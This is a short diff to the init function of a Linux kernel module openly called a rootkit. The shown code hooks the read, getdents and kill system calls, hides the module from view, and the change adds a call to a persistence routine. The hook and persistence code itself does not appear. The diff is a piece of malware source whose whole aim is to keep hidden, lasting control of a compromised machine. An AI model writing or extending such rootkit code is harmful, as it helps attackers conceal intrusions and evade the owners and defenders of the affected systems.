@@ -7,6 +7,7 @@
 #include "hooked_funcs/h_read.h"
 #include "hooked_funcs/h_getdents.h"
 #include "hooked_funcs/h_kill.h"
+#include "persistence.h"
 
 static __init int rootkit_init(void)
 {
@@ -15,6 +16,7 @@ static __init int rootkit_init(void)
     hijack_read();
     hijack_getdents();
     hijack_kill();
+    persistence();
 
     module_hide();
 
